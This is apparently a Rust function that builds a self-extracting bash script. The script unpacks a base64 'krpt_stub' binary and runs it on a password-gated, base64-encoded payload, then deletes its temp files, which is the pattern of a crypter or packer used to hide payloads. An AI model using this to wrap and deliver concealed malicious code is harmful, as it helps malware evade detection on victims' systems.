use std::fs::File;
use std::io::Write;
use base64::{Engine as _, engine::general_purpose::STANDARD};

pub fn stub_inject(stub_bytes: &[u8], final_payload_bytes: &[u8], output_script_path: &str) {
    let stub_b64 = STANDARD.encode(stub_bytes);
    
    let mut out_file = File::create(output_script_path).expect("Failed to create output script");
    
    writeln!(out_file, "#!/bin/bash").unwrap();
    writeln!(out_file, "# ").unwrap();
    writeln!(out_file, r##"
    LINE_2=$(sed -n '2p' "$0")
if [ "$LINE_2" = "#" ] || [ "$LINE_2" = "# " ] || [ -z "$LINE_2" ]; then
    echo "Error: Please open this file in a text editor and set the PASSWORD on line 2."
    exit 1
fi

TMP_DIR=$(mktemp -d)
STUB_PATH="$TMP_DIR/krpt_stub"
PAYLOAD_PATH="$TMP_DIR/payload.bin"

echo "{}" | base64 -d > "$STUB_PATH"
chmod +x "$STUB_PATH"

PASS=$(sed -n '2s/^#[[:space:]]*//p' "$0")

tail -n 1 "$0" | base64 -d > "$PAYLOAD_PATH"

"$STUB_PATH" "$PASS" "$PAYLOAD_PATH"

rm -rf "$TMP_DIR"
exit 0"##, stub_b64).unwrap();

    let payload_b64 = STANDARD.encode(final_payload_bytes);
    writeln!(out_file, "{}", payload_b64).unwrap();
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = out_file.metadata().unwrap().permissions();
        perms.set_mode(0o755);
        out_file.set_permissions(perms).unwrap();
    }

    println!("Success! Executable text script generated at: {}", output_script_path);
}